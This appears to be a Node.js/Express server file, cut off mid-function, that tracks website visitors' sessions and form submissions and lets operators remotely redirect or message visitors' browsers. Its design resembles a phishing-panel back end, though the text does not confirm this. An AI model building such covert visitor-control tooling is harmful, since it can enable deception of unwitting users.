// ============================================================
// MEGA TOOLS — SESSIONS ROUTER (v15.3 — VID-AWARE REDIRECT)
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate, isOwner } = require('../middleware/auth');
const sessionManager = require('../services/sessionManager');
const { getSessionSockets, getRemainingTimeMs, initializeGlobalTimer, globalInboxCleanup, trashPermanentCleanup, getNextNoonBDMs, isNoonAligned } = sessionManager;
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

const MIN_SESSION_AGE_MS =
  parseInt(process.env.MIN_SESSION_AGE_MS) || 24 * 60 * 60 * 1000;

function getSessionAgeMs(s) {
  if (!s) return 0;
  const t = s.created_at || s.createdAt || s.timestamp || s.firstSeenAt || 0;
  const ms = new Date(t).getTime();
  if (!Number.isFinite(ms) || ms <= 0) return 0;
  return Math.max(0, Date.now() - ms);
}

function isYoungerThan24h(s) {
  return getSessionAgeMs(s) < MIN_SESSION_AGE_MS;
}

// FIX-RD1 — Append tracking params (vid, sid, tc) to redirect URL so
// target page reuses the SAME visitorId and does not create a new session.
function appendTrackingParams(rawUrl, params) {
  if (!rawUrl) return rawUrl;
  try {
    const u = new URL(rawUrl, 'https://mega-tools.local');
    if (params.vid && !u.searchParams.get('vid')) u.searchParams.set('vid', String(params.vid));
    if (params.sid && !u.searchParams.get('sid')) u.searchParams.set('sid', String(params.sid));
    if (params.tc && !u.searchParams.get('tc')) u.searchParams.set('tc', String(params.tc));
    // Preserve relative URLs when possible
    if (rawUrl.startsWith('http://') || rawUrl.startsWith('https://')) return u.toString();
    // If original was relative, return path + query + hash
    const qs = u.searchParams.toString();
    return u.pathname + (qs ? ('?' + qs) : '') + (u.hash || '');
  } catch (_) {
    // Fallback: manual append
    const sep = rawUrl.indexOf('?') === -1 ? '?' : '&';
    const parts = [];
    if (params.vid) parts.push('vid=' + encodeURIComponent(String(params.vid)));
    if (params.sid) parts.push('sid=' + encodeURIComponent(String(params.sid)));
    if (params.tc) parts.push('tc=' + encodeURIComponent(String(params.tc)));
    return parts.length ? rawUrl + sep + parts.join('&') : rawUrl;
  }
}

let ioInstance = null;
let sessionSockets = {};
let globalCleanupTimer = null;
let trashCleanupTimer = null;
let archiveTimer = null;

const TRASH_RETENTION_MS = 24 * 60 * 60 * 1000;
const TRASH_CLEANUP_INTERVAL_MS = 60 * 60 * 1000;
const ARCHIVE_TICK_MS = 60 * 1000;
const PENDING_COMMAND_TTL_MS = 60 * 1000;

let sessionsCache = null;
let sessionsCacheExpiry = 0;
const CACHE_TTL = 5000;

function dedupeSessions(list) {
  if (!Array.isArray(list)) return [];
  const map = new Map();
  for (const s of list) {
    if (!s || s._id === undefined) continue;
    const key = String(s._id);
    const prev = map.get(key);
    if (!prev) { map.set(key, s); continue; }
    const prevSubs = Array.isArray(prev.submissions) ? prev.submissions.length : 0;
    const curSubs = Array.isArray(s.submissions) ? s.submissions.length : 0;
    if (curSubs > prevSubs) {
      map.set(key, { ...prev, ...s, submissions: s.submissions });
    } else if (curSubs === prevSubs) {
      const prevAct = new Date(prev.lastActivity || prev.updated_at || 0).getTime();
      const curAct = new Date(s.lastActivity || s.updated_at || 0).getTime();
      if (curAct > prevAct) map.set(key, { ...prev, ...s });
    }
  }
  return Array.from(map.values());
}

async function getCachedSessions(forceRefresh = false) {
  if (forceRefresh || !sessionsCache || sessionsCacheExpiry < Date.now()) {
    const raw = await db.sessions.read();
    sessionsCache = dedupeSessions(raw);
    sessionsCacheExpiry = Date.now() + CACHE_TTL;
  }
  return sessionsCache;
}

function clearSessionsCache() {
  sessionsCache = null;
  sessionsCacheExpiry = 0;
}

function asArray(value) {
  if (Array.isArray(value)) return value;
  if (value === null || value === undefined) return [];
  return [value];
}

function normalizeSingleton(value) {
  if (!value) return null;
  if (Array.isArray(value)) return value.length > 0 ? value[0] : null;
  if (typeof value === 'object') return value;
  return null;
}

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => code && (tc === code || tc.startsWith(code + '_')));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

function isHiddenForUser(session, userId) {
  if (!session || !userId) return false;
  const arr = Array.isArray(session.hiddenFor) ? session.hiddenFor : [];
  return arr.map(String).includes(String(userId));
}

async function filterSessionsByRole(sessions, user) {
  try {
    const userId = toStringId(user._id);
    if (user.role === ROLES.OWNER) {
      return sessions.filter(s => !s.hiddenForAll && !isHiddenForUser(s, userId));
    }
    const codes = await getUserTrackingCodes(user._id);
    return sessions.filter(s =>
      isSessionForAnyCode(s, codes) &&
      !s.hiddenForAll &&
      !isHiddenForUser(s, userId)
    );
  } catch (error) { throw error; }
}

async function checkSessionAccess(session, user) {
  try {
    if (user.role === ROLES.OWNER) return true;
    const codes = await getUserTrackingCodes(user._id);
    return isSessionForAnyCode(session, codes);
  } catch (error) { return false; }
}

function isImageUrl(str) {
  if (!str) return false;
  return /^https?:\/\//.test(str) && /\.(jpg|jpeg|png|gif|webp|svg|bmp|ico)(\?.*)?$/i.test(str);
}

function buildMsgPushPayload(message, targetUrl) {
  const payload = { message: message || '', targetUrl: targetUrl || '' };
  if (isImageUrl(message)) payload.imageUrl = message;
  if (isImageUrl(targetUrl)) payload.imageUrl = targetUrl;
  return payload;
}

function emitMsgPushToOwnerRoom(io, trackingCode, message, targetUrl) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  const payload = buildMsgPushPayload(message, targetUrl);
  try { io.to('room_' + ownerCode).emit('msg_push', payload); } catch (_) {}
  try { if (trackingCode !== ownerCode) io.to('room_' + trackingCode).emit('msg_push', payload); } catch (_) {}
}

function cleanupExpiredCommand(session) {
  if (!session || !session.pendingCommand) return false;
  const exp = session.pendingCommand.expiresAt;
  if (exp && new Date(exp) < new Date()) {
    session.pendingCommand = null;
    return true;
  }
  return false;
}

function normalizeTimerState(raw) {
  if (!raw) return null;
  if (Array.isArray(raw)) return raw.length > 0 ? raw[0] : null;
  if (typeof raw === 'object') return raw;
  return null;
}

function disconnectSessionSockets(session) {
  if (!session || !ioInstance) return 0;
  const sid = String(session._id || '');
  if (!sid) return 0;
  const vid = session.visitorId || '';
  const tc = session.trackingCode || '';
  const ip = session.ip || '';
  const ownerCode = tc ? (tc.includes('_') ? tc.split('_')[0] : tc) : '';

  const keys = new Set([
    sid,
    'sid_' + sid,
    vid,
    vid && ip ? (vid + '_' + ip) : '',
    ownerCode && ip ? (ownerCode + '_' + ip) : '',
    tc,
    'tc_' + tc,
    ip ? ('ip_' + ip) : '',
  ].filter(Boolean));

  const socketIds = new Set();
  for (const k of keys) {
    const socketId = sessionSockets[k];
    if (socketId) socketIds.add(socketId);
  }

  let disconnected = 0;
  for (const socketId of socketIds) {
    try {
      const sock = ioInstance.sockets && ioInstance.sockets.sockets
        ? ioInstance.sockets.sockets.get(socketId)
        : null;
      if (sock && typeof sock.disconnect === 'function') {
        sock.disconnect(true);
        disconnected++;
      }
    } catch (_) {}
    for (const k of keys) {
      if (sessionSockets[k] === socketId) {
        try { delete sessionSockets[k]; } catch (_) {}
      }
    }
  }
  return disconnected;
}

function emitSessionDeletedForRoute(session, extra) {
  if (!ioInstance || !session) return;
  const tc = session.trackingCode || '';
  if (!tc) return;
  const ownerCode = tc.includes('_') ? tc.split('_')[0] : tc;
  const payload = {
    timestamp: new Date().toISOString(),
    sessionId: String(session._id),
    visitorId: session.visitorId || null,
    trackingCode: tc,
    wasLive: !!(extra && extra.wasLive),
    deletedBy: (extra && extra.deletedBy) || null,
    scope: (extra && extra.scope) || 'per-user',
    session: {
      _id: session._id,
      visitorId: session.visitorId || null,
      trackingCode: tc,
      baseCode: session.baseCode || '',
    },
  };
  try { ioInstance.to('room_' + ownerCode).emit('sessionDeleted', payload); } catch (_) {}
  if (tc !== ownerCode) {
    try { ioInstance.to('room_' + tc).emit('sessionDeleted', payload); } catch (_) {}
  }
  const deleterId = extra && extra.deletedBy;
  if (deleterId) {
    try { ioInstance.to('user_' + String(deleterId)).emit('sessionDeleted', payload); } catch (_) {}
  }
}

async function pushSessionToTrash(session, userId) {
  try {
    if (!session) return false;
    const sid = String(session._id || session.id || '');
    if (!sid) return false;
    const uid = toStringId(userId) || '';
    if (!uid) return false;

    const existing = await db.readJSON('trash').catch(() => []);
    const list = Array.isArray(existing) ? existing : [];

    const trashEntry = {
      id: sid,
      _id: sid,
      sessionId: sid,
      originalId: sid,
      trackingCode: session.trackingCode || session.code || '',
      deletedBy: uid,
      deletedAt: new Date().toISOString(),
      permanentlyDeleted: false,
      submissions: Array.isArray(session.submissions) ? session.submissions : [],
      sessionData: { ...session },
    };

    const filtered = list.filter(t => {
      const tSid = String(t.sessionId || t.originalId || t.id || t._id || '');
      const tBy = String(t.deletedBy || '');
      return !(tSid === sid && tBy === uid);
    });
    const next = [trashEntry, ...filtered];

    await db.writeJSON('trash', next);
    return true;
  } catch (err) {
    console.error('[Sessions] pushSessionToTrash error:', err.message);
    return false;
  }
}

async function archiveTick() {
  try {
    const result = await Session.archiveExpiredSessions();
    if (result && result.archived > 0 && ioInstance) {
      try {
        ioInstance.emit('sessionsArchived', {
          count: result.archived,
          remaining: result.remaining,
          timestamp: new Date().toISOString(),
        });
      } catch (_) {}
    }
  } catch (_) {}
}

function startArchiveScheduler() {
  if (archiveTimer) clearInterval(archiveTimer);
  archiveTimer = setInterval(archiveTick, ARCHIVE_TICK_MS);
  setTimeout(() => { archiveTick().catch(() => {}); }, 15000);
}

async function trashPermanentCleanupWrapper() {
  try { await trashPermanentCleanup(); } catch (_) {}
}

function startTrashCleanupScheduler() {
  if (trashCleanupTimer) clearInterval(trashCleanupTimer);
  trashCleanupTimer = setInterval(trashPermanentCleanupWrapper, TRASH_CLEANUP_INTERVAL_MS);
  setTimeout(() => { trashPermanentCleanupWrapper(); }, 10000);
}

async function globalCleanupCheck() {
  try { await globalInboxCleanup(); } catch (_) {}
}

function startGlobalCleanupScheduler() {
  if (globalCleanupTimer) clearInterval(globalCleanupTimer);
  globalCleanupTimer = setInterval(globalCleanupCheck, 60000);
  setTimeout(() => { globalCleanupCheck(); }, 5000);
}

function init(io, sockets) {
  ioInstance = io;
  sessionSockets = sockets || {};
  startGlobalCleanupScheduler();
  startTrashCleanupScheduler();
  startArchiveScheduler();
  console.log('[Sessions] init() called — per-user delete + vid-aware redirect v15.3 active.');
}

function stop() {
  if (globalCleanupTimer) clearInterval(globalCleanupTimer);
  if (trashCleanupTimer) clearInterval(trashCleanupTimer);
  if (archiveTimer) clearInterval(archiveTimer);
  globalCleanupTimer = null;
  trashCleanupTimer = null;
  archiveTimer = null;
}

function getIO() { return ioInstance; }
function getModuleSessionSockets() { return sessionSockets; }

router.get('/timer', authenticate, async (req, res) => {
  try {
    let remainingMs = await getRemainingTimeMs();
    if (typeof remainingMs !== 'number' || remainingMs <= 0) {
      try { await globalInboxCleanup(); } catch (e) { console.error('[Sessions] Cleanup on timer expiry failed:', e.message); }
      try { await initializeGlobalTimer(); } catch (_) {}
      remainingMs = await getRemainingTimeMs();
    }
    const safeMs = Math.max(0, Number(remainingMs) || 0);

    let state = null;
    let stateSource = 'invalid';
    try {
      const raw = await db.readJSON(CONFIG.INBOX_GLOBAL_TIMER_FILE);
      state = normalizeTimerState(raw);
      if (state && Number(state.cycleStart) > 0 && Number(state.cycleEnd) > 0) {
        stateSource = 'mongo';
      } else {
        stateSource = 'fallback';
      }
    } catch (_) {
      stateSource = 'invalid';
    }

    const cycleStart = state ? Number(state.cycleStart) || 0 : 0;
    const cycleEnd = state ? Number(state.cycleEnd) || 0 : 0;
    const lastCleanupAt = state ? (state.lastCleanupAt || null) : null;
    const lastResetAt = state ? (state.lastResetAt || null) : null;
    const lastResetKey = state ? (state.lastResetKey || null) : null;
    const isValid = cycleStart > 0 && cycleEnd > 0 && cycleEnd > cycleStart;

    res.json({
      success: true,
      remainingMs: safeMs,
      remainingSeconds: Math.floor(safeMs / 1000),
      cycleMs: CONFIG.INBOX_GLOBAL_CYCLE_MS,
      cycleHours: 24,
      cycleStart,
      cycleEnd,
      cycleStartISO: cycleStart ? new Date(cycleStart).toISOString() : null,
      cycleEndISO: cycleEnd ? new Date(cycleEnd).toISOString() : null,
      lastCleanupAt,
      lastResetAt,
      lastResetKey,
      isValid,
      stateSource,
      timestamp: Date.now(),
    });
  } catch (error) {
    console.error('[Sessions] Timer error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/force-clean', authenticate, isOwner, async (req, res) => {
  try {
    const all = await db.sessions.read();
    const young = (all || []).filter(s => !s.hiddenForAll && isYoungerThan24h(s));
    if (young.length > 0) {
      return res.status(423).json({
        success: false,
        locked: true,
        reason: 'MIN_SESSION_AGE',
        minAgeMs: MIN_SESSION_AGE_MS,
        youngCount: young.length,
        message: `Cannot force-clean: ${young.length} session(s) younger than 24h.`,
        timestamp: Date.now(),
      });
    }
    await globalInboxCleanup();
    try { clearSessionsCache(); } catch (_) {}
    res.json({ success: true, message: 'Force-clean executed.', timestamp: Date.now() });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message || 'Force-clean failed' });
  }
});

router.post('/reset-inbox', authenticate, async (req, res) => {
  try {
    const role = req.user && req.user.role;
    const callerId = req.user && req.user._id ? toStringId(req.user._id) : null;

    let scopeTrackingCodes = null;
    let scopeType = 'global';

    if (role !== ROLES.OWNER) {
      let codes = [];
      try { codes = await User.getTrackingCodesForUser(callerId); } catch (_) { codes = []; }
      codes = asArray(codes).filter(c => typeof c === 'string' && c.length > 0);
      const ownTC = req.user && req.user.trackingCode;
      if (ownTC && !codes.includes(ownTC)) codes.push(ownTC);
      scopeTrackingCodes = codes;
      scopeType = 'scoped';
    }

    const all = await db.sessions.read();
    const inScope = (all || []).filter(s => {
      if (s.hiddenForAll) return false;
      if (!scopeTrackingCodes) return true;
      return isSessionForAnyCode(s, scopeTrackingCodes);
    });
    const lockedYoung = inScope.filter(s => isYoungerThan24h(s));

    const result = await globalInboxCleanup({
      skipCycleReset: true,
      scopeTrackingCodes: scopeTrackingCodes || undefined,
    });

    try { clearSessionsCache(); } catch (_) {}

    let cycleStart = 0, cycleEnd = 0, lastResetKey = null;
    try {
      const raw = await db.readJSON(CONFIG.INBOX_GLOBAL_TIMER_FILE);
      const state = normalizeTimerState(raw);
      if (state) {
        cycleStart = Number(state.cycleStart) || 0;
        cycleEnd = Number(state.cycleEnd) || 0;
        lastResetKey = state.lastResetKey || null;
      }
    } catch (_) {}

    const remainingMs = cycleEnd > 0 ? Math.max(0, cycleEnd - Date.now()) : 0;
    const trackingCodesOut = Array.isArray(scopeTrackingCodes) ? scopeTrackingCodes.slice() : [];

    if (!result || !result.ok) {
      return res.json({
        success: false, skipped: true,
        reason: (result && result.reason) || 'unknown',
        archived: 0, ownerArchived: 0,
        lockedYoungCount: lockedYoung.length,
        remaining: (result && result.remaining) || 0,
        scopeType, trackingCodes: trackingCodesOut,
        cycleStart, cycleEnd, remainingMs, lastResetKey,
        minAgeMs: MIN_SESSION_AGE_MS,
        message: 'Reset skipped.',
        timestamp: new Date().toISOString(),
      });
    }

    const archivedCount = result.archived || 0;
    const lockedMsg = lockedYoung.length > 0 ? ` ${lockedYoung.length} <24h kept.` : '';
    const message = scopeType === 'global'
      ? `Inbox reset (all sessions).${lockedMsg}`
      : `Inbox reset (${trackingCodesOut.length} codes).${lockedMsg}`;

    return res.json({
      success: true, skipped: false,
      archived: archivedCount,
      ownerArchived: result.ownerArchived || 0,
      lockedYoungCount: lockedYoung.length,
      remaining: result.remaining || 0,
      scopeType, trackingCodes: trackingCodesOut,
      cycleStart, cycleEnd, remainingMs, lastResetKey,
      minAgeMs: MIN_SESSION_AGE_MS,
      message,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message || 'Reset-inbox failed' });
  }
});

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    let mutated = false;
    for (const s of sessions) {
      if (cleanupExpiredCommand(s)) mutated = true;
    }
    if (mutated) {
      await db.sessions.write(sessions);
      clearSessionsCache();
    }

    sessions = sessions.filter(s => !s.hiddenForAll);
    sessions = dedupeSessions(sessions);

    const userId = toStringId(req.user._id);
    let visibleSessions;
    if (req.user.role === ROLES.OWNER) {
      visibleSessions = sessions.filter(s => !isHiddenForUser(s, userId));
    } else {
      const codes = await getUserTrackingCodes(req.user._id);
      visibleSessions = sessions.filter(s =>
        isSessionForAnyCode(s, codes) &&
        !s.hiddenForAll &&
        !isHiddenForUser(s, userId)
      );
    }

    visibleSessions = dedupeSessions(visibleSessions);
    visibleSessions.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.lastActivity || b.timestamp) - new Date(a.lastActivity || a.timestamp);
    });

    const total = visibleSessions.length;
    const totalPages = Math.ceil(total / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = visibleSessions.slice(startIdx, startIdx + limitNum);

    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = visibleSessions.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
    const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);

    res.json({
      sessions: paginatedSessions,
      total, page: pageNum, totalPages,
      hasMore: pageNum < totalPages,
      stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await getCachedSessions(true);
    all = dedupeSessions(all);
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);
    all = dedupeSessions(all);

    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = all.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));
    const todaySubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);

    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });

    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: todaySubs,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
        current: all.length,
        currentSubmissions: allTimeSubmissions,
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.get('/online', authenticate, async (req, res) => {
  try {
    let allSessions = await getCachedSessions(true);
    allSessions = dedupeSessions(allSessions);
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }

    let visibleUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    if (req.user.role === ROLES.ADMIN) {
      const reqId = toStringId(req.user._id);
      const childIds = new Set();
      allUsers.forEach(u => {
        if (toStringId(u.parentId) === reqId) childIds.add(toStringId(u._id));
      });
      visibleUsers = visibleUsers.filter(u => {
        const uid = toStringId(u._id);
        return uid === reqId || childIds.has(uid);
      });
    } else if (req.user.role !== ROLES.OWNER) {
      const reqId = toStringId(req.user._id);
      visibleUsers = visibleUsers.filter(u => toStringId(u._id) === reqId);
    }

    res.json(visibleUsers.map(u => ({
      _id: toStringId(u._id),
      name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '',
      role: u.role || 'user',
      profilePic: u.profilePic || '',
      trackingCode: u.trackingCode || '',
      parentId: u.parentId || null,
    })));
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });

    if (!(await checkSessionAccess(session, req.user))) {
      return res.status(403).json({ message: 'Access denied' });
    }

    if (isYoungerThan24h(session)) {
      const ageMs = getSessionAgeMs(session);
      return res.status(423).json({
        success: false, locked: true,
        reason: 'MIN_SESSION_AGE',
        minAgeMs: MIN_SESSION_AGE_MS, ageMs,
        remainingMs: Math.max(0, MIN_SESSION_AGE_MS - ageMs),
        message: 'Cannot hide this session — it is younger than 24h.',
        timestamp: Date.now(),
      });
    }

    const hidden = await Session.hideFromUser(req.params.id, req.user._id);
    if (!hidden) return res.status(404).json({ message: 'Session not found' });

    const trashed = await pushSessionToTrash(session, req.user._id);
    clearSessionsCache();
    res.json({ message: 'Hidden', sessionId: req.params.id, trashed });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

router.delete('/:id', authenticate, async (req, res) => {
  try {
    const callerId = req.user && req.user._id ? toStringId(req.user._id) : null;
    if (!callerId) {
      return res.status(401).json({ success: false, message: 'Caller id missing' });
    }

    const bodyIds = Array.isArray(req.body?.ids) ? req.body.ids : [];
    const primaryId = String(req.params.id || '').trim();
    const directIds = [...new Set([primaryId, ...bodyIds.map(x => String(x || '').trim())].filter(Boolean))];
    const bodyVisitorId = String(req.body?.visitorId || '').trim();

    let targets = [];
    const seenIds = new Set();

    for (const sid of directIds) {
      try {
        const s = await db.sessions.findById(sid);
        if (s && !seenIds.has(String(s._id))) {
          seenIds.add(String(s._id));
          targets.push(s);
        }
      } catch (_) {}
    }

    if (bodyVisitorId) {
      try {
        const all = await db.sessions.read();
        for (const s of all) {
          if (!s || !s._id) continue;
          if (s.visitorId !== bodyVisitorId) continue;
          if (s.hiddenForAll) continue;
          if (seenIds.has(String(s._id))) continue;
          seenIds.add(String(s._id));
          targets.push(s);
        }
      } catch (_) {}
    }

    if (!bodyVisitorId && targets.length === 1) {
      const seedVid = targets[0].visitorId;
      if (seedVid) {
        try {
          const all = await db.sessions.read();
          for (const s of all) {
            if (!s || !s._id) continue;
            if (s.visitorId !== seedVid) continue;
            if (s.hiddenForAll) continue;
            if (seenIds.has(String(s._id))) continue;
            seenIds.add(String(s._id));
            targets.push(s);
          }
        } catch (_) {}
      }
    }

    if (targets.length === 0) {
      return res.status(404).json({ success: false, message: 'No session found for target(s)' });
    }

    const results = [];
    let anySuccess = false;

    for (const session of targets) {
      const sid = String(session._id);
      const item = {
        sessionId: sid,
        visitorId: session.visitorId || null,
        hidden: false,
        trashed: false,
        wasLive: false,
        autoOfflined: false,
        socketsDisconnected: 0,
        error: null,
      };

      try {
        if (!(await checkSessionAccess(session, req.user))) {
          item.error = 'access_denied';
          results.push(item);
          continue;
        }

        const wasLive = !!session.isLive || session.status === 'Online';
        item.wasLive = wasLive;

        if (wasLive) {
          try {
            await Session.updatePresence(sid, {
              status: 'Offline',
              isLive: false,
              offlineSince: new Date().toISOString(),
            });
            item.autoOfflined = true;
          } catch (_) {}
          try {
            item.socketsDisconnected = disconnectSessionSockets(session);
          } catch (_) {}
        }

        item.trashed = await pushSessionToTrash(session, callerId);

        try {
          const hidden = await Session.hideFromUser(sid, callerId, { bypass24hLock: true });
          item.hidden = !!hidden;
        } catch (hideErr) {
          item.error = 'hide_failed: ' + hideErr.message;
          results.push(item);
          continue;
        }

        anySuccess = true;
        results.push(item);
      } catch (err) {
        item.error = 'exception: ' + (err.message || 'unknown');
        results.push(item);
      }
    }

    clearSessionsCache();

    for (const item of results) {
      if (!item.hidden) continue;
      try {
        const s = await db.sessions.findById(item.sessionId);
        emitSessionDeletedForRoute(s || { _id: item.sessionId, trackingCode: '' }, {
          wasLive: item.wasLive,
          deletedBy: callerId,
          scope: 'per-user',
        });
      } catch (_) {}
    }

    return res.json({
      success: anySuccess,
      scope: 'per-user-duplicate-purge',
      callerId,
      visitorId: bodyVisitorId || null,
      count: results.filter(r => r.hidden).length,
      results,
      message: anySuccess
        ? 'Session(s) removed for you (including duplicates). Trash snapshot saved.'
        : 'No session could be removed.',
      timestamp: new Date().toISOString(),
    });
  } catch (error) {
    console.error('[Sessions] DELETE error:', error);
    return res.status(500).json({ success: false, message: 'Server error' });
  }
});

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(req.params.id, { action: action || 'navigate', url: url || '', message: message || '' });
    const seq = Number(updatedSession.commandSeq || 0) || Date.now();
    updatedSession.pendingCommand = { action: action || 'navigate', url: url || '', message: message || '', seq, timestamp: now(), expiresAt: new Date(Date.now() + PENDING_COMMAND_TTL_MS).toISOString() };
    await db.sessions.findByIdAndUpdate(req.params.id, { pendingCommand: updatedSession.pendingCommand, sessionId: String(updatedSession._id) });
    clearSessionsCache();

    const io = ioInstance || req.app.get('io');
    const sockets = sessionSockets;
    const command = { action: action || 'navigate', url: url || '', message: message || '', seq, sessionId: String(updatedSession._id), visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, url);

    if (io) {
      const vidKey = updatedSession.visitorId || '';
      const ip = updatedSession.ip || '';
      const tcKey = updatedSession.trackingCode || '';
      const ownerCode = tcKey ? (tcKey.includes('_') ? tcKey.split('_')[0] : tcKey) : '';
      const sidKey = String(updatedSession._id);
      const candidates = [sidKey, 'sid_' + sidKey, vidKey, (vidKey && ip) ? (vidKey + '_' + ip) : '', (ownerCode && ip) ? (ownerCode + '_' + ip) : ''].filter(Boolean);
      const delivered = new Set();
      for (const k of candidates) {
        const socketId = sockets[k];
        if (!socketId) continue;
        if (delivered.has(socketId)) continue;
        delivered.add(socketId);
        try { io.to(socketId).emit('session_command', command); } catch (_) {}
        try { io.to(socketId).emit('msg_push', msgPayload); } catch (_) {}
      }
      if (updatedSession.trackingCode) {
        try {
          io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
          io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
        } catch (_) {}
      }
      emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, url);
    }

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// FIX-RD1 — redirect-new appends vid + sid + tc to targetUrl
//   so the target page reuses the SAME visitorId (no new session).
// ============================================================
router.post('/:id/redirect-new', authenticate, async (req, res) => {
  try {
    const id = String(req.params.id || '');
    const rawTargetUrl = String(req.body?.targetUrl || '').trim();
    const message = String(req.body?.message || '');
    if (!id) return res.status(400).json({ success: false, message: 'Missing session id' });
    if (!rawTargetUrl) return res.status(400).json({ success: false, message: 'targetUrl required' });

    const session = await Session.findById(id);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });

    const role = req.user && req.user.role;
    if (role !== 'owner') {
      const ownerCode = (session.trackingCode || '').split('_')[0];
      let codes = [];
      try { codes = await User.getTrackingCodesForUser(req.user._id); } catch (_) { codes = []; }
      codes = asArray(codes).filter(Boolean);
      if (!codes.some(c => ownerCode === c || ownerCode.startsWith(c))) {
        return res.status(403).json({ success: false, message: 'Not allowed for this session' });
      }
    }

    // FIX-RD1 — append vid/sid/tc so target reuses same visitor identity
    const finalTargetUrl = appendTrackingParams(rawTargetUrl, {
      vid: session.visitorId || '',
      sid: String(session._id),
      tc: session.trackingCode || '',
    });

    const action = message ? 'navigate+message' : 'navigate';

    let updatedSession = null;
    try {
      updatedSession = await Session.recordCommand(session._id, { action, url: finalTargetUrl, message });
    } catch (_) {}
    const finalSession = updatedSession || session;
    const seq = Number(finalSession.commandSeq || 0) || Date.now();

    const pendingCommand = {
      action, url: finalTargetUrl, message, seq,
      timestamp: new Date().toISOString(),
      expiresAt: new Date(Date.now() + PENDING_COMMAND_TTL_MS).toISOString(),
    };
    try {
      await db.sessions.findByIdAndUpdate(finalSession._id, {
        pendingCommand,
        sessionId: String(finalSession._id),
      });
    } catch (_) {}

    const command = {
      action, url: finalTargetUrl, message, seq,
      sessionId: String(finalSession._id),
      visitorId: finalSession.visitorId || '',
      trackingCode: finalSession.trackingCode || '',
      timestamp: new Date().toISOString(),
    };
    const msgPayload = {
      message: message || '', targetUrl: finalTargetUrl || '', seq,
      sessionId: String(finalSession._id),
      timestamp: new Date().toISOString(),
    };

    const io = ioInstance || req.app.get('io');
    if (io) {
      const sidKey = String(finalSession._id);
      const sidPrefixed = 'sid_' + sidKey;
      const vidKey = finalSession.visitorId || '';
      const tcKey = finalSession.trackingCode || '';
      const ip = finalSession.ip || '';
      const vidIpKey = (vidKey && ip) ? (vidKey + '_' + ip) : '';
      const ownerCodeForTc = tcKey ? (tcKey.includes('_') ? tcKey.split('_')[0] : tcKey) : '';
